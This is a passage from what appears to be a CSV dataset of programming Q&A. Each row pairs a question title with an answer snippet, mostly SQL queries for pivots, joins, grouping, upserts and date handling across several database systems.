GROUP BY LEFT(measure, CHARINDEX('_', measure)-1)
"
7011,67707,"sql pivot table (date, string)","declare @str varchar(MAX)
declare @q varchar(MAX)
declare @fromDate date
declare @toDate date

set @fromDate ='2015-01-01'
set @toDate ='2015-03-01'
set @str=''
select @str = @str + '[' + cast(DATE as varchar) + '],'
from (select distinct DATE from Table1 where DATE between @fromDate and @toDate) as A

set @q =
'SELECT WORKER, '+left(@str,len(@str)-1)+'
FROM 
(SELECT WORKER, DATE, HOURS
FROM Table1) p
PIVOT
(
MIN (HOURS)
FOR [DATE] IN
( '+left(@str,len(@str)-1)+' )
) AS pvt'
exec (@q)
"
8989,53379,Generating the query,"SELECT  CONVERSATIONID
FROM    conversationTable a
WHERE   UserID IN (1, 2) AND   -- <<== list of UserID you want to find
        EXISTS
        (
            SELECT  1
            FROM    conversationTable b
            WHERE   a.CONVERSATIONID = b.CONVERSATIONID
            GROUP   BY CONVERSATIONID
            HAVING  COUNT(*) = 2 -- <<== number of userID on the list
        )
GROUP   BY CONVERSATIONID
HAVING  COUNT(*) = 2 -- <<== number of userID on the list
"
13606,74694,SQL one to one without relation,"WITH first_table AS (select *, ROWNUM AS rn FROM ...)
   , secnd_table AS (select *, ROWNUM AS rn FROM ...)
SELECT first_table.*, secnd_table.*
  FROM first_table INNER JOIN secnd_table USING (rn)
"
39376,19626,Easiest way to implement this SQL query?,"select  case 
        when min(Value - isnull(yt2.Value,0)) > 0 then 0
        else -min(Value - isnull(yt2.Value,0))
        end
from    YourTable yt1
join    YourTable yt2
on      yt1.Key = 'A' and yt2.key = 'B'
        or
        yt1.Key = 'B' and yt2.key = 'C'
"
28533,33326,cursor values in SQL query,"declare
  l_count pls_integer;
begin
  for r_cur in (
    select columnname
    from shiv_tab_col
  )
  loop
    execute immediate 
      'select count(1) from ser_shiv_syn where '||r_cur.columnname||' is null' 
    into l_count;
    dbms_output.put_line(l_count);
    dbms_output.put_line(r_cur.columnname);
  end loop;
end;
/
"
30208,36706,How to add a new key with increment value to all documents in MongoDB?,"var i = 0;
db.collection.find().forEach(function(myDoc) {
    db.collection.update(myDoc, {$set : {""myId"": i++ }}, false, true);  
});
"
18194,52997,ApplySimple Formula for Current year in Microstrategy,"Year(CurrentDate())
"
16652,38195,SQL Joins with 4 tables,"SELECT 
  c.id,
  c.brand,
  c.type,
  c.license
  ce.id_car,
  ... 
from table_equipments AS e
INNER JOIN table_cars_equipments AS ce ON e.id     = ec.id_equipment 
INNER JOIN table_cars            AS c  ON c.id     = ce.id_car
INNER JOIN table_distances       AS d  ON d.id_car = c.id
WHERE e.name LIKE 'fire extinguisher'
  AND d.date = ?;
"
17220,45299,Find Query - Filter by array size after $elemMatch,"db.test.aggregate([
    { ""$match"" : { ""contents.name"" : ""yorkie"" } },
    { ""$unwind"" : ""$contents"" },
    { ""$match"" : { ""contents.name"" : ""yorkie"" } },
    { ""$group"" : { ""_id"" : ""$_id"", ""sz"" : { ""$sum"" : 1 } } },    // use $first to include other fields
    { ""$match"" : { ""sz"" : { ""$gte"" : 2 } } }
])
"
2903,19066,How to make query perform better using a dependent sub query in SQL?,"--Fetch records from Table one based on all filtering conditions
        -- this will reduce the logical read when we apply join
        SELECT
            T1.id_no,
            T1.condition_code,
            T1.doe
        INTO
            #Temp
        FROM
            attrcoll_month T1
        WHERE
            T1.doe >= '01/09/2014'
            AND T1.doe < '03/01/2014'
            AND T1.unique_code = 'XXY';

        -- Get all the min time for only required ids. This will avoid the sub query and also read get reduced since records in #temp are
    limited
        SELECT
            MIN(trans_time) MinTime,
            T.id_no
        INTO
            #tempMinTime
        FROM
            #Temp T
            JOIN live_trans T2_MIN ON T.id_no = T2_MIN.id_no;
        --Merging #1 and #2
        SELECT
            T1.id_no,
            T1.condition_code,
            COUNT(T1.condition_code) AS count,
            T1.doe,
            T2.id_no,
            T2.trans_time,
            T2.from_routing_pos
        FROM
            #Temp T1
            JOIN #tempMinTime T ON T1.id_no = T.id_no
            JOIN live_trans T2 ON T.id_no = T2.id_no
        WHERE
            T2.trans_time = T.MinTime
        GROUP BY
            T2.from_routing_pos,
            T1.condition_code;
"
1510,24888,SQL Server: running every sql script in a directory,"@echo off
for %%f in (*.sql) do (
    echo executing %%f
    osql -E -i %%f
)

pause
"
20077,57981,Deriving currently on loan items,"var items = from loan in loans
            orderby loan.LoanDate desc
            group loan by loan.EquipmentId into grp
            let userId = grp.First().ToUser
            where userId != null
            select new { EquipmentId = grp.Key, UserId = userId };
"
11863,13565,Replacing two MINUS/EXCEPT queries,"SELECT 
  value1, value2, value3,
  sum(decode(uploadID, 'afterTurning', 1, 'beforeTurning', -1)) AS diff
FROM table1 
GROUP BY value1, value2, value3
HAVING sum(decode(uploadID, 'afterTurning', 1, 'beforeTurning', -1)) <> 0
"
10172,41416,select best attribute of a row SQL oracle,"select year, month,
       max(balance) as balance,
       max(SSN) keep (dense_rank first order by balance desc) as ssn
from t
group by year, month;
"
1544,44029,"Remove Redundant Values in Cell built from LISTAGG, Oracle SQL","select field1, LISTAGG(d.field2, ';') WITHIN GROUP (ORDER BY field2)
from (select distinct a.field1, d.field2
      from table1 a join
           table2 b
           on a.field2 = b.field2 join
           table4 c
           on b.field2 = c.field2 join
           table5 d
           on c.field3 = d.field3
      ) t
group by field1
"
13730,69164,insert made instead of update resulting in duplicate rows. how to fix?," where iv.ano=2013 and iv.municipio_fk IS NOT DISTINCT FROM carga.municipio_fk 
      and iv.indicador_fk IS NOT DISTINCT FROM carga.indicador_fk
      etc...
"
25760,66530,"Oracle, describe users recyclebin, SQLPLUS","SELECT *
FROM dba_recylebin
WHERE owner = 'FOOBAR'
"
38539,19978,how to handle mysql tables with same id,"Student(id,name,mail,password)
Article(id,art_name,description)
"
3066,6373,DateAdd with abbreviation from column,"SELECT (case when PeriodTime = 'day'
             then DATEADD(day, ROW_NUMBER() OVER (ORDER BY mt.ID), mt.StartTime)
             when PeriodTime = 'month'
             then DATEADD(month, ROW_NUMBER() OVER (ORDER BY mt.ID), mt.StartTime)
             when PeriodTime = 'year'
             then DATEADD(year, ROW_NUMBER() OVER (ORDER BY mt.ID), mt.StartTime)
        end) AS INCREMENT
FROM MOCKTABLE mt
"
31041,19088,Using SQL CASE statement but returning same column values,"select case numbers 
         when 0 
         then '-' 
         else cast(numbers as varchar(19)) 
       end as numbers
"
16576,8622,ORDER JOIN Left not taking effect,"select * from
(select a.id, field_list_you_want from table1 a
left join table2 o ON a.id = o.item_id

order by a.id,o.date desc) temp
group by id 
"
16553,13562,OPTION (RECOMPILE) is Always Faster; Why?,"EXEC sp_updatestats
"
28987,58317,T-SQL All occurrences in a range,";WITH Tally AS (
  SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) - 1 AS i
  FROM (VALUES (0), (0), (0), (0), (0)) AS t1(n)
  CROSS JOIN (VALUES (0), (0), (0), (0), (0)) AS t2(n)
)
SELECT m.EventId, DATEADD(m, t.i, FirstOccurance_Month) AS [Month]
FROM Tally AS t
INNER JOIN mytable AS m
ON DATEADD(m, t.i, FirstOccurance_Month) <= LastOccurance_Month
ORDER BY m.EventId
"
21063,22183,MySQL Insert from 2 source tables to one destination table,"mysql> INSERT INTO ing_title_categories (ID_Title, ID_Category)
    -> SELECT
    ->     ing_titles.ID_Title,
    ->     ing_categories.ID_Category
    -> FROM ing_titles, ing_categories
    -> where (ing_titles.ID_Title = 2) AND (ing_categories.ID_Category = 2)
    -> ;
Query OK, 1 row affected (0.07 sec)
Records: 1  Duplicates: 0  Warnings: 0

mysql> select * from ing_title_categories;
+-------------------+----------+-------------+
| ID_Title_Category | ID_Title | ID_Category |
+-------------------+----------+-------------+
|                17 |        2 |           2 |
+-------------------+----------+-------------+
1 row in set (0.00 sec)  
"
39125,22782,How can I combine all this into one SQL UPDATE query?,"UPDATE FoodIntake 
   SET MealType = 'B' 
 WHERE substr(Time, -8) 
        BETWEEN (SELECT BrkStrt FROM Patient WHERE PatientId = :currentPatient)
            AND (SELECT LunchStrt FROM Patient WHERE PatientId = :currentPatient)
"
23896,39990,Day of Week occurrences counter,"    SELECT empnum,
    count(DISTINCT dateadd(day, datediff(day, 0, starttime), 0)) AS NumberOfSundays
FROM TABLE
WHERE (
        datename(dw, starttime) = 'Sunday'
        OR (
            datename(dw, starttime) = 'Saturday'
            AND datename(dw, endtime) = 'Sunday'
            AND empnum NOT IN (
                SELECT empnum
                FROM TABLE
                WHERE datename(dw, starttime) = 'Sunday'
                )
            )
        )
GROUP BY empnum
"
9605,16906,How can I do a yearly report grouped by month?,"select to_char(trunc(date,'yyyy'),'YYYY') as year, sum(number_of_transactions)
from header
where date < trunc(sysdate, 'mm')
group by trunc(date,'yyyy')
order by year
"
26232,9733,how to replace overflows with NULL?,"case when (rbaging.billing_period_end - 693594)>1
then DATEADD(DD, rbaging.billing_period_end - 693594, '1900-01-01')
else '' end,

case when (rbaging.billing_period_apply - 693594)>1
then DATEADD(DD, rbaging.billing_period_apply - 693594, '1900-01-01')
else ''
end
"
10394,56330,"SQL - return all rows, however non-unique rows are merged into one (arithmetic performed)?","select B, C, D, sum(E*F) / sum(F), sum(F), sum(G), sum(H), sum(I)
from MyTable
group by B, C, D
"
22606,21683,Adding ' at the start of each row of a table through sql,"update my_table set product_code = ""'"" & product_code & ""'"";
"
34308,6502,Database Toll Layout,"ALTER TABLE Tarif ADD CONSTRAINT FK_autobahn_id FOREIGN KEY (autobahn_id) REFERENCES Autobahn(ID) ON UPDATE CASCADE ON DELETE CASCADE
"
18386,72804,How to join with most recent record?,"proc sql;
   create index bond
      on work.daily_transactions(bond);
quit;

proc sql;
   create index bond
      on work.bond_ratings(bond);
quit;
"
20132,38660,Add and order row on SQL result,"with cte_number_list as (
  select     rownum my_number
  from       dual
  connect by level <= 5)
select t.my_date,
       l.my_number,
       t.type
from   cte_number_list l left outer join
       my_table        t partition by (t.my_date)
                         on l.my_number = t.my_number;
"
31435,60181,Oracle MySQL equivalent code,"SELECT *
FROM (select t.*, rownum rn, count(*) over() as SQL_CALC_FOUND_ROWS
        from student_details t
       where UPPER(name) like UPPER(?))
WHERE rn <= offset 
"
12957,3638,How to insert the number of id in the neighbor column?,"INSERT INTO `table_name` VALUES(NULL, (SELECT `AUTO_INCREMENT` FROM  INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'database_name' AND TABLE_NAME = 'table_name'));
"
6131,37154,INSERT with INNER JOIN and Predetermined Values,"INSERT INTO Products (Code, ManufacturerId, VendorId, IsActive, Name, NamePlural, ShortDescription, Description, UpSellMessage, Cost, Price, IsOnSale, SalePrice, IsShipable, ShipPrice, Weight, Length, Width, Height, HasCountryTax, HasStateTax, HasLocalTax, DateAdded, Keywords, Inventory_Tracked, DropShip, DownloadOneTime, DealTimeIsActive, MMIsActive, ProductType, RecurringSubscriptionPrice, PaymentPeriod, Term, BillingDelay, SaleType, BundleGroupID, ComputePrice, PriceUp, PriceChangedAmount, PriceChangedType, SwatchesPerRow, ChangeOnClick, ChangeOnMouseover, ShowCloseUpLink, LinkBigImage, SwatchAllignment, DescriptionAllignment, DetailLink)
    select table2.col1, 1, 1, 0, table2.col1, table2.col1, table2.col4, table2.col4, 'some message that does not matter', table2.col3, table2.col2, 0, '0', 1, '8', '3', '8', '8', '8', 1, 1, 1, '12/27/2013', ' ', 0, 0, 0, 0, 0, 0, 0, '0', 0, 0, 0, 0, 0, 1, '0', 0, 0, 0, 0, 0, 0, 0, 0, table2.col1+'.aspx'
    FROM otherProducts table2;
"
3507,37135,Counting page views using webmatrix/razor,"var sPropertyId = Request.QueryString[""PropertyID""];
var views = ""INSERT INTO PropertyViews (PropertyID, ViewTimestamp) VALUES (@0, GetDate())"";
db.Execute(views, sPropertyId);
"
15094,28965,What's the best way to select the minimum value from several columns?,"Select Id,
       Case When Col1 < Col2 And Col1 < Col3 Then Col1
            When Col2 < Col1 And Col2 < Col3 Then Col2 
            Else Col3
            End As TheMin
From   YourTableNameHere
"
9555,46827,Query to get data in ascending interval format,"SELECT  col
FROM
(
        SELECT '1' col  FROM DUAL UNION ALL
        SELECT '10-20'  FROM DUAL UNION ALL
        SELECT '3-5'    FROM DUAL UNION ALL
        SELECT '5-3'    FROM DUAL UNION ALL
        SELECT '25-34'  FROM DUAL UNION ALL
        SELECT '20-25'  FROM DUAL UNION ALL
        SELECT '2'      FROM DUAL UNION ALL
        SELECT '4-8'    FROM DUAL
)
ORDER   BY
        TO_NUMBER(regexp_substr(col, '\w+', 1, 1))
,       TO_NUMBER(regexp_substr(col, '\w+', 1, 2))


1
2
3-5
4-8
5-3
10-20
20-25
25-34
"
13661,21777,Query pl/sql record type in a simple sql,"select * from table(mypackage.myfunc());
"
34278,41251,Replace function with variable and use it in return value,"set @diff = null;
SELECT @diff := TIMESTAMPDIFF(MINUTE, now(), end_at),
IF( @diff > 1440, @diff / 7, @diff) as minutesLeft
FROM table
"
15614,10650,Basic Select Distinct issue,"WITH head (otord#, ojhttn$) as (
  SELECT DISTINCT otord#, ojhttn$
    FROM replib.clspaytpl
    WHERE otusrn in ('ANDON','SCH','JRU','BERT','TRA','LINA')
      AND ottrnd >= 20140701)
SELECT h.otord#, h.ojhttn$, d.otusrn, d.ottrnc, d.ottrnd
  FROM head h, 
       TABLE (SELECT * 
          FROM replib.clspaytpl
          WHERE otord# = h.otord# 
            AND ojhttn$ = h.ojhttn$
            AND otusrn in ('ANDON','SCH','JRU','BERT','TRA','LINA)
            AND ottrnd >= 20140701
          FETCH FIRST ROW ONLY) d
"
23983,74443,SQL counting rows by grouping,"SELECT T1.id as id, COUNT(COALESCE(T2.totalcountdepartmentuserwise, 0)) AS totalcountdepartmentuserwise 
FROM (
      SELECT DISTINCT id FROM users WHERE company_id = 33
     ) AS T1 
     LEFT JOIN (
        SELECT user_id, COUNT(distinct user_id) AS totalcountdepartmentuserwise FROM userlogs WHERE created_at BETWEEN '2016-01-01' AND '2016-01-25' GROUP BY user_id, DATE(created_at) ORDER BY user_id
     ) AS T2 ON T2.user_id = t1.id GROUP BY id  
"
8256,16632,Boolean Field in Oracle,"
create table tbool (bool char check (bool in (0,1));
insert into tbool values(0);
insert into tbool values(1);`
"
1760,16210,SQL ESCAPE with multiple LIKE conditions,"SELECT * FROM [table] WHERE [column1] LIKE 'value1!%' ESCAPE '!' AND [column2] LIKE 'value2!%' ESCAPE '!'
"
23687,62885,hotel reservation system SQL: identify any room available in date range,"SELECT r.* 
FROM rooms r
  LEFT JOIN availability a ON (r.id = a.room_id 
 AND a.date_occupied BETWEEN :start_date AND :end_date)
WHERE a.id IS NULL
"
14407,46671,Join to an oracle table valued function,"SQL> create or replace type typ_person
  2      as object (
  3        person_id number,
  4        person_name varchar2(30)
  5      );
  6  /

Type created.

SQL> create or replace type tbl_person
  2    as table of typ_person;
  3  /

Type created.

SQL> ed
Wrote file afiedt.buf

  1  create or replace function get_person_list
  2    return tbl_person
  3  is
  4    l_people tbl_person;
  5  begin
  6    select typ_person( empno, ename )
  7      bulk collect into l_people
  8      from emp;
  9    return l_people;
 10* end;
SQL> /

Function created.

SQL> select p.*
  2    from emp e
  3         join table( get_person_list() ) p on (p.person_id = e.empno);

 PERSON_ID PERSON_NAME
---------- ------------------------------
      7623 PAV
      7369 smith
      7499 ALLEN
      7521 WARD
      7566 JONES
      7654 MARTIN
      7698 BLAKE
      7782 CLARK
      7788 SCOTT
      7839 KING
      7844 TURNER
      7876 ADAMS
      7900 SM0
      7902 FORD
      7934 MILLER
      1234 FOO

16 rows selected.
"
20405,25258,"Why does MySql allow ""group by"" queries WITHOUT aggregate functions?","SELECT user.id, user.name, COUNT(post.*) AS posts 
FROM user 
  LEFT OUTER JOIN post ON post.owner_id=user.id 
GROUP BY user.id
"
17987,22074,Update MySQL tables with some duplicated entries,"CREATE UNIQUE INDEX Table1Column3 on Table1(Column3);

INSERT INTO Table1(Column1, Column2, Column3)
SELECT Column1, Column2, Column3
FROM Table2
ON DUPLICATE KEY UPDATE Column1 = Table2.Column1, Column2 = Table2.Column2
"
9434,45022,How can I get the min and max date per date of employees?,"group by tranDate, Employee_Number
"
34975,15414,sql to calculate daily totals minues the previous day's totals,"SELECT o.report_date, o.tech, o.total_cpe, 
o.total_cpe -  (
    SELECT  IIf(Sum(oos.total_cpe) is null, 0,Sum(oos.total_cpe)) AS total_cpe 
    FROM oos 
    WHERE (((oos.tech)=o.tech) AND ((oos.report_date)<o.report_date))
) AS total
FROM oos o;
"
13905,3931,Count two Columns with two  Where Clauses,"SELECT
    COUNT(DISTINCT member_id) AS MEMBERS,
    COUNT(*) AS TRANS
FROM
    tbl
WHERE 
    member_id NOT IN
    (
        SELECT DISTINCT member_id
        FROM tbl
        WHERE trans_date > '2012-01-01'
    )
"
38468,59593,SQL exclude certain records in subquery,"SELECT Item FROM
(
(SELECT Item, Count(*) Cnt FROM 

(SELECT Item FROM Received1
UNION ALL
SELECT Item FROM Received2
UNION ALL
SELECT Item FROM Received3
UNION ALL
SELECT Item FROM Recovered1
UNION ALL
SELECT Item FROM Recovered2
UNION ALL
SELECT Item FROM Recovered3)A  GROUP BY Item)B
WHERE Cnt%2 = 0 --checks for multiples of 2
"
1031,69002,Convert historic dates from utc to local time,"    SELECT CASE
         WHEN [theDate] BETWEEN 
         Convert(DATETIME, Convert(VARCHAR(4), Year([theDate])) + '-03-' + Convert(VARCHAR(2), (31 - (5 * Year([theDate])/4 + 4) % 7)) + ' 02:00:00', 20)
         AND
         Convert(DATETIME, Convert(VARCHAR(4), Year([theDate])) + '-10-' + Convert(VARCHAR(2), (31 - (5 * Year([theDate])/4 + 1) % 7)) + ' 03:00:00', 20)
         THEN Dateadd(hh, 2, [theDate])
         ELSE Dateadd(hh, 1, [theDate])
       END AS [theDate],
       [theValue]
FROM   [YOURTABLE] 
"
32490,9665,MySQL groupby in stages,"SELECT *
FROM (
     SELECT id, type, type_id, content, MATCH(content) AGAINST('john') as relevance, IFNULL(parent_type, UUID()) as parent_type, IFNULL(parent_id, UUID()) as parent_id
     FROM mytable WHERE MATCH(content) AGAINST('john*' IN BOOLEAN MODE) GROUP BY parent_type, parent_id
) as search
GROUP BY search.type, search.type_id DESC  LIMIT 10 ;
"
16285,6677,How to select from one database and insert it into another?,"insert into db1.Tbl1(name,steamid) values (select name, steamid from db2.Tbl2)
"
39045,10242,SQL SERVER T-SQL Add SubTotal by group and Total,"select (case when GROUPING(CustomerName) = 0 and
                  GROUPING(Employee) = 1 and 
                  GROUPING(DocDate) = 1 and
                  GROUPING(LegalID) = 1
             then 'Total ' + CustomerName
             when GROUPING(CustomerName) = 1 and
                  GROUPING(Employee) = 1 and
                  GROUPING(DocDate) =1 and
                  GROUPING(LegalID) = 1 then 'Total'
             else CustomerName
        end) as CustomerName,
       LegalID, Employee,DocDate,
       sum(DocTotal) as DocTotal,
       sum(DueTotal) as DueTotal 
From @Sales 
group by grouping sets((LegalID, CustomerName ,Employee, DocDate),
                       (CustomerName),
                       ()
                      );
"
6171,48051,"How to insert if not exists, or increase if exists in SQLite?","INSERT OR REPLACE INTO Test (Id,Val) 
  VALUES (  1,          
            COALESCE((SELECT Val + 1 FROM Test WHERE id = 1), 1)
          );
INSERT OR REPLACE INTO Test (Id,Val) 
  VALUES (  2,          
            COALESCE((SELECT Val + 1 FROM Test WHERE id = 2), 1)
          );
"
25565,45918,Efficient query for finding duplicate records,"SELECT
    *
FROM
    Transactions t1
        inner join
    Transactions t2
        on
            t1.Terminal = t2.Terminal and
            t1.Amount = t2.Amount and
            DATEDIFF(minute,t2.TransactionDate,t1.TransactionDate) between 0 and 10 and
            t1.TransactionID > t2.TransactionID /* prevent matching the same row */
"
38114,71424,Microsoft Access Query Top 50% and Last 50% Values,"select * 
from TABLE
where TABLEID not in (
    select top (
        (select count(*) from TABLE) - 700000
    ) TABLEID
    from TABLE
)
"
945,66547,mysql query to update all values +1 where value is less than 100,"update test set value=value+1 where value < 100
"
17764,67841,How to GROUP BY in groups of N rows?,"select avg(age)
from (select t.*, (@rn := @rn + 1) as seqnum
      from table t cross join
           (select @rn := 0) vars
      order by mydate desc
     ) t
group by floor((seqnum - 1) / 3);
"
16197,38705,Oracle SQL - Update procedure only non null values,"UPDATE CUSTOMER_INFO
   SET CUSTOMER_TYPE     = NVL(CustomerType, CUSTOMER_TYPE),
       CUSTOMER_NAME     = NVL(CustomerName, CUSTOMER_NAME),
       CUSTOMER_GENDER   = NVL(CustomerGender, CUSTOMER_GENDER),
       CUSTOMER_BIRTHDAY = NVL(CustomerBirthday, CUSTOMER_BIRTHDAY)
 WHERE CUSTOMER_ID = CustomerID;
"
4315,20188,The server principal Xuser is not able to access the database Ydb under the current security context. sql server 2008,"USE [Kdb];
GO
GRANT CONNECT TO guest;
"
14976,49421,Trying to join 2 tables with same column names,"SELECT email, password FROM companies_tbl
UNION ALL SELECT email, password FROM korisnici_tbl
"
16090,61768,"Combine: updating Values Code (with Case statement, Inner Join)","update New_Clients_Report set
YTD_Jan13 = (case   when StatementID>=NewClientDate then 'New from ' 
             + REPLACE(RIGHT(CONVERT(VARCHAR(9), NewClientDate, 6), 6), ' ', '-')
             else 'Repead' end)
from New_Clients_Report so inner join MonthSales_NC nc
on so.ClientID=nc.NewClientID 
--and nc.NewClientDate='01.01.2013'
"
658,71612,how to check if there exists 2nd highest score in SQL?,"SELECT MAX(score)
FROM table_name
WHERE score<>(
SELECT MAX(score)
FROM table_name);
"
35416,56134,Select Records Only Having Records within Supplied Date Range,"SELECT * 
FROM Cart AS c
INNER JOIN CartDetail AS cd ON cd.CartId = c.Id
WHERE cd.DateAdded BETWEEN @start_date AND @end_date
      AND 
      NOT EXISTS (SELECT 1
                  FROM CartDetail AS cd2
                  WHERE cd2.CartId = c.Id AND
                        cd2.DateAdded < @start_date OR cd2.DateAdded > @end_date)
"
34031,75446,MySql SELECT COUNT ... NOT LIKE,"SELECT 
    COUNT(
            CASE 
                WHEN restricted NOT LIKE '%us%' THEN 2 
                ELSE 1 
            END
    ) AS totalcount 
FROM 
    reviews 
WHERE 
    restricted NOT LIKE '%us%' 
    AND restricted != '' 
    AND restricted IS NOT NULL
"
21733,65485,"sql query help, syntax help to select records not selected by inner select statement","select pid from table where pid not in (select top 10 pid from table1)
"
12126,39716,SQL import/export,"SELECT'INSERT INTO Table1(Col1,Col2) VALUES('+CAST(Col1 AS VARCHAR(500))+',' +CAST(Col2 AS VARCHAR(500))+')' FROM Table1  
"
31174,70512,Receive product groups and products with one query,"hashmap results, parent, nodes, nodes_new; # variables


foreach  (res in sql_execute(""SELECT id, parent_id FROM product_group;"") ) {
    parent[res.id] = res.parent_id;
}

# get groups with products
foreach  (res in sql_execute(""SELECT pg.id FROM product_group AS pg INNER JOIN 
        product AS p ON pg.id = p.group_id 
        WHERE p.quick_select = 1 GROUP BY pg.id "") ) {
    nodes[res.id] = res.id;
}

while (length(nodes) > 0) {
    foreach (i in nodes) {
        if (i = 0) { results[i] = i; } # if its a root node, add to results
        else { nodes_new[parent[i]] = parent[i]; } # otherwise, add parent to the next round
    }
    nodes = nodes_new; # prepare for next round
}

print results;
"
23005,30021,SQL select one row for every n minutes,"Declare @NumberPerHour Int = 20

;With Cte As
(
    Select  DateTime, Row_Number() Over (Partition By DateDiff(Hour, 0, DateTime) Order By NewId()) RN
    From    Master
)
Select  DateTime
From    Cte
Where   RN <= @NumberPerHour
Order By DateTime Asc
"
27565,59310,Declare a variable in Oracle SQL to use in a query,"variable var DATE
exec :var := '15-OCT-13'
"
1248,53236,Add AS-Expression to selected columns in getCollection(),"$_products->getSelect()
    ->columns(
         array(
             'category_name' => new Zend_Db_Expr('some string')
         )
    );
"
15789,13419,drop all tables from sql ce database,"select 'drop table ' || table_name || ';'
  from information_schema.tables;
"
35235,37754,intervals with equal density sql,"SELECT  MIN(number_of_trades)::text || '-' || MAX(number_of_trades)::text AS ""number of trades"" 
, COUNT(number_of_trades) AS ""number of traders""
, AVG(number_of_trades*profit) AS AvgProfit 
FROM 
(
   SELECT ROW_NUMBER() OVER(ORDER BY number_of_trades) AS rn
     , number_of_trades
     , profit 
     , (COUNT(*) OVER(PARTITION BY NULL) / 100) AS Grp
   FROM TradersStat
  ) tab
GROUP BY (rn - 1) / Grp
"
23686,48367,How to remove some value from SQL Table by query,"BEGIN TRAN
UPDATE CustomerImage SET Link = REPLACE(Link, 'pages/small/', '')
SELECT * FROM CustomerImage
ROLLBACK  --change this to a commit after you're sure it's working the way you want
"
14180,72979,MySQL for grouping with one column and getting a subgroup from another column,"SELECT COUNT(*) AS ""times"", username, date
FROM mytable 
GROUP BY date, username ORDER BY date DESC
"
9237,16986,How do I tell if data formatting inconsistencies are themselves consistent?,"select t1.*
from t1
where not exists (select 1
                  from t2
                  where t2.name = substring(t1.columnB, 6)
                 );
"
32055,36646,SQL View select data from two fields and combine into one,"CASE WHEN ID1 = 'blank' THEN ID2 ELSE ID1 END
"
39769,45788,On a single column : Algebraic operation on Aggregate functions,"select sum(case when mod(id,2)=0 then A else 0 end) -
       sum(case when mod(id,2)=0 then 0 else a end)
  from test
 where yourCondition
"
11379,12575,Avoid unique conflicts on insert SQL SERVER,"CREATE TABLE products (
    ProductId INT IDENTITY(1, 1), 
    ProductType int, ProductOwnerId INT, 

    CONSTRAINT [unq_type_owner] UNIQUE (ProductType, ProductOwnerId)
);

MERGE INTO dbo.products p
USING (VALUES (22, 44))  AS source(ProductType, ProductOwnerId)
ON p.ProductType = source.ProductType AND p.ProductOwnerId = source.ProductOwnerId

WHEN NOT MATCHED THEN
    INSERT (ProductType, ProductOwnerId)
    VALUES (source.ProductType, source.ProductOwnerId)

-- OPTIONAL OUTPUT
OUTPUT $action, Inserted.* ;
"
25353,16407,Get last record for each date from a table,"WITH MyCte AS (SELECT  *,
                       RowNum = ROW_NUMBER() OVER (PARTITION BY CONVERT(CHAR(8), UpdateDateTime, 112) ORDER BY UpdateDateTime DESC ) 
               FROM    InventoryHistory
               WHERE   UpdateDateTime >= convert(char(8), dateadd(yy, -30, getdate()), 112)
                       AND DATEPART(hh, UpdateDateTime) < 17)
SELECT   UpdateID, 
         ProductID, 
         UpdateDateTime, 
         QuantityOnHand 
FROM     MyCte
WHERE    RowNum = 1


/* Results 
UpdateID    ProductID   UpdateDateTime          QuantityOnHand
----------- ----------- ----------------------- --------------
2           1           2009-07-29 14:00:00.000 99
4           1           2009-07-30 09:00:00.000 97

(2 row(s) affected)
*/
"
10047,60035,"In SQL how can I have two fields that can't both be identical, only one is a primary key","create table ProductTasks
 ( ProductID ...
 , TaskId ...
 , TaskOrder ...
 , primary key (ProductId, TaskId)
 , unique (ProductId, TaskOrder)
 );
"
34462,19442,SQL select distinct rows,"SELECT col1, MAX(col2) FROM some_table GROUP BY col1;
"
20091,53773,Select with priority order,"with car as (select 1 id, 'bmw' model, 'blue' colour from dual union all
             select 2 id, 'bmw' model, 'red' colour from dual union all
             select 3 id, 'bmw' model, null colour from dual union all
             select 4 id, 'porsche' model, null colour from dual union all
             select 5 id, 'porsche' model, 'red' colour from dual union all
             select 6 id, 'vw' model, 'orange' colour from dual union all
             select 7 id, 'car' model, null colour from dual union all
             select 8 id, 'vw' model, 'purple' colour from dual)
select id,
       model
from   (select id,
               model,
               colour,
               row_number() over (partition by model 
                                  order by decode(colour, 'blue', 1, 'red', 2, 3), colour) rn
        from   car)
where  rn = 1
order by id;

    ID MODEL  
---------- -------
         1 bmw    
         5 porsche
         6 vw     
         7 car 
"
20502,14560,Mysql Database Layout,"table store will contains your 2000s stores
    id
    name

table code will contains your 50 codes
    id
    name

table code_store will contains only the valid codes ID, and related store_id(no need to save invalid ones I guess)
    code_id
    store_id
"
12899,40281,Change sql parameter based on a public variable from an if statement,"Dim MachineEnd As String
    'declare machine end string
If Combobox.SelectedValue = 5 Then
    MachineEnd = ""StringA""
ElseIf Combobox.SelectedValue = 6 Then
    MachineEnd = ""StringB""
ElseIf Combobox.SelectedValue = 7 Then
    MachineEnd = ""StringC""
...
    End if
...
"
12737,42417,SQL - Selecting unique values from one column then filtering based on another,"select * from T where Product_type = 'B' and id in (
select id from T
    group by id
    having count(id) = 1)
"
8440,66465,Can I set VARCHAR size larger than 8k but less than MAX?,"CHECK (DATALENGTH([VarChar10000]) <= 10000)
"
34774,30279,Cannot get anything to return via SQL Query,"SELECT job_name, job_start_time, job_end_time 
FROM job
WHERE (date(job_start_time) = date('2014-02-10') AND job_name = 'start') or
      (date(job_end_time) = date('2014-02-11') AND job_name = 'end')
ORDER BY job_end_time ASC;
"
32858,70087,SQL select statement with column being null sometimes,"  with w_data as ( 
           select 33 volume, 1234 ticket, 10.5 hours, 190 rate, 1995 amount from dual union all
           select 90 volume, 1234 ticket, 90   hours, 100 rate, 9000 amount from dual union all
           select 33 volume, 1235 ticket, 11   hours, 190 rate, 2090 amount from dual union all
           select 90 volume, 1235 ticket, 90   hours, 110 rate, 9900 amount from dual 
        )
  Select case when ticket = lag(ticket) over (partition by ticket order by ticket, volume) then volume else null end new_volume, 
        case when ticket = lag(ticket) over (partition by ticket order by ticket, volume) then null else ticket end new_ticket, 
           hours, rate, amount
    from w_data
  order by ticket, volume
  /

  NEW_VOLUME NEW_TICKET      HOURS       RATE     AMOUNT
  ---------- ---------- ---------- ---------- ----------
                   1234       10.5        190       1995
          90                    90        100       9000
                   1235         11        190       2090
          90                    90        110       9900

  4 rows selected.
"
21770,43893,"Convert SQL to Linq - Where, Groupby and Having","var result = context.dailypos
    .GroupBy(x => x.posdate)
    .Where(g => g.Select(x => x.customernumber).Distinct().Count() == 3)
    .Select(g => g.Key)
    .OrderByDescending(x => x)
    .Take(1);
"
30146,64099,SQLite - How to get query's result depending linked tables?," SELECT * FROM place_table WHERE id IN (SELECT place_id FROM spot_table)
